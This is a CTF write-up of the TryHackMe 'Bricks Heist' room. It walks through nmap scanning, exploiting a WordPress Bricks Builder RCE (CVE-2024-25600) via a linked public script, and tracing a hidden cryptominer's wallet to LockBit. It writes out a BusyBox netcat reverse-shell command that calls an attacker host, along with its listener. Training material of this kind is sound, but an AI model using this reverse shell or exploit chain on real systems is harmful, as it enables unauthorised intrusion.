
# TryHack3M: Bricks Heist Write-up

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/00_Room.png)


Welcome to another Write-up! In this room, we are tasked to hack back into _Brick Press Media Co._ Systems after their server got compromised and lost access to it. Judging by the room's description, we will need to abuse a Remote Code Execution (RCE) vulnerability, recognized as a CVE.  
Before we start, please run the following command so your AttackBox or machine can recognize the website under "bricks.thm" instead of just the IP address. This Write-up will refer to using this Domain

```bash
sudo echo MACHINE_IP bricks.thm >> /etc/hosts
```

Enough talking, let's get started

## Reconnaissance and Enumeration

When you added the IP to your `/etc/host` file as **bricks.thm**, visit it using this link: https://bricks.thm/

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/01_Website.png)

Before I start enumerating Information about the running server and it's web page, I like to perform a Nmap Scan. This should always be your first approach when dealing with a new system or CTF. 

```bash
nmap -sV -sC MACHINE_IP
```
> This nmap scan establishes a full TCP Three-way handshake to the 1024 common ports in order to perform Nmap scripts and Version detection. 

We get convenient Information out of this scan. The result it too large to paste it here, but to sum up, we have:

```txt
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql    MySQL (unauthorized)
``` 
> Result if we would not append the `-sC` flag

To sum up, 4 ports are, each giving us beneficial information. On port 80, a python webserver is running, and on port 443, an Apache Webserver is running. I tried accessing it through my browser, but it just redirects to the same page. We should keep SSH and MySQL in mind for later if we can find credentials somewhere. 
After that, I tried to enumerate hidden web directories for that page with Gobuster. However, that gave me some errors, because you cant really access the page via HTTP, as it responds with a 405 method forbidden. Trying to that that over HTTPS also didn't work as the page doesn't have a trusted singed certificate. Instead of wasting time trying to find a solution, I moved on to the next step, which is checking the source code. 

I checked the Source code for a bit and noticed some things:
- The Website is running on WordPress: 
  ![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/02_WordPress.png)
- Several WordPress APIs are in use and could potentially exploited
- Trying to access the assets of the web page responses with a 403 Forbidden error code (https://bricks.thm/wp-content/themes/bricks/assets/)
- Whenever you try to access a page that doesn't exit, you get redirected to this page
  ![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/03_Page-not-Found.png)
- Searching something there created following Search query: `/?s=SearchTerm`
  > I tried to see if the Server would respond with sensitive Data
  > ![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/04_Exploit-attempt.png)
  
  However, keep that page in mind, as we could maybe trigger a SQL injection here. I just didn't try it yet as the description of the room indicates a RCE vulnerability! 

Looking back at my previous nmap scan, I noticed that the one of the nmap scripts marked `/robots.txt` as accessible on port 80. So I checked to see what's in there

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/05_Robots-txt.png)

Awesome! I could've saved some time if I would've just paid more attention to the nmap result, dumb mistake! Anyways, let's see what's going on at this page. Accessing the full path only displays a page showing a "0". I tried to go one directory back, and that redirected me to a WordPress Login page for **Bricks.thm**. (To bricks.thm, add `/wp-admin`)

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/06_WordPress-login.png)

This is probably the door into the server! I am guessing a SQL Injections could work here really well. I tried to enter default Credentials such as "admin:admin", and the page gave response feedback such as "admin is not registered on this site". Meaning we could try different usernames, until we get another error. However, maybe there is already an exploit for that. I checked the Nmap scan from earlier again to see if there was any WordPress Version mentioned. 
Indeed there was. For Port 443, a nmap script found: `http-generator: WordPress 6.5`

Let's try to find a working exploit. Searching for "WordPress 6.5 CVE Exploit". I found some results from 2024, but that were only Path Traversal and XXS Vulnerabilities which don't actually help getting into the system or performing RCE. So I added "RCE" to my search. Funny Enough, there was a new RCE Vulnerability discovered recently for WordPress 6.5 (Like 2 months ago). I knew the room was from 2024, so I tried to find a Remote code execution Vulnerability from back then. 

After some digging, I found the following CVE: _CVE-2024-25600_ with a CVSS of 10.0! It affects WordPress Brick Builder, which is used by the application if you couldn't tell already. Looking for an exploit, I found: [CVE-2024-25600 Exploit]([https://github.com/Chocapikk/CVE-2024-25600](https://github.com/ivanbg2004/ODH-BricksBuilder-CVE-2024-25600-THM?tab=readme-ov-file))

Let's clone the Repo to our AttackBox and run the Script following the instructions in their README:

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/07_Running-exploit.png)

## Initial Access
Bingo! We have a shell! Now let's get the first flag:

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/08_flag.png)

Not that we have access, we can follow the question of the room. We are now tasked to find a suspicious Process. I first tried to ran `ps aux` but quickly realized it would take too long to find something useful there. Looking at the 3rd question, it asked what the associated Service for that process was. This would be much easier to figure out first, and with that we could get the process name as well. So I ran `systemctl | grep running`

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/09_Service-name.png)

Knowing that `.service` files are written in plain text and are used to describe how processes should be ran, we could just try to read that service file and find the process name there

```bash
systemdtl cat REDACTED.service
```

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/10_Process-name.png)

I then wanted to switch to the `/lib/NetworkManager/` directory, but our current shell doesn't allow that. I could switch to a reverse shell for a more stable connection. Here's a quick run through to do that:
1. Check the current shell type: `echo $0` -> In our case, we have a sh shell!
2. Go to [revshells](https://www.revshells.com/) and generate a BusyBox Reverse shell since we have a sh type
   -> `busybox nc ATTACKER_MACHINE 4444 -e /bin/sh`
3. Start a listener on your Attacker Machine: `nc -lvnp 4444`
4. Paste the payload from step 2 in your current established shell of the target

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/11_Stable-shell.png)

Our BusyBox reverse shell wont give any supportive feedback messages, so if something doesn't work, check if you typed your command correctly

Now let's change the directory to: `cd /lib/NetworkManager/`
Of course, let's list what's in there. Once I did that, I looked in some files that could be of importance like `conf.d` or `inet.conf`. Turns out `inet.conf` is the log file for the bitcoin miner:

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/12_log-data.png)

Notice the ID there? If you are starting a bitcoin miner, you would want the mined data to be transferred to your wallet. This log here shows that the Bitcoin miner was started, but in order to be started, it should know to which ID it should transfer the bitcoins to. I noted the ID for now, however, before trying to do something with it. I generated the md5 hash for the running process on the system we identified before, to look it up on Cyber threat intel sites to maybe get a wallet address there. VirusTotal didn't have anything useful, not even to which threat Group it could belong.
Instead I went back to the ID and tried to decode it. Threat actors love to encode their code or sensitive data which they don't want to be identified that easily. I went to CyberChef and used it's magic option:

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/13_Wallet.png)

Trying to figure out to which group the wallet belongs, I stumbled upon Blockchain, probably the most common website when it comes to Crypto currency and stuff. I was never into that, so aye, learned something new on my Cyber security Journey! Checking the transaction History on Blockchain for that Wallet, I noticed there was one wallet address that didn't start with `bc1q`

![Picture of the room](/Easy_rooms/TryHack3M-Bricks-Heist/Screenshots/14_Transaction.png)

Let's look up that address now. When you paste it into google, you will already notice a press release from the [Office of Foreign Assets Control](https://ofac.treasury.gov/ "Home") which states that a Russian citizen called "ivan gennadievich kondratiev" is the owner of that Wallet. Searching up his name will show a press release from the [U.S. Department of the Treasury](https://home.treasury.gov/ "Home") stating they identified 2 Russian individuals who are part of the Russian Ransomware group ... LockBit!

And we are done!

## Conclusion

This room took me longer than expected! I definitely had fun while trying this room. I tried to step out more of my comfort zone and actually work like a pentester, which is why I tried to map out parts of the website instead of already going to the Admin Login page. However, I do have to admit that I struggled with the version identification and thus finding a fitting CVE exploit. That part definetly took me the longest. I would've found the CVE quicker if I knew that the Website was running a specific WordPress Brick Builder version, which was vulnerable. I should definetly try to learn how to find exploits more efficiently or identify running versions more accurate. I hope you got something out of this Write-up, I tried to explain as much as possible for people that may still be rather unexperienced like I am! See ya at my next write-up!  
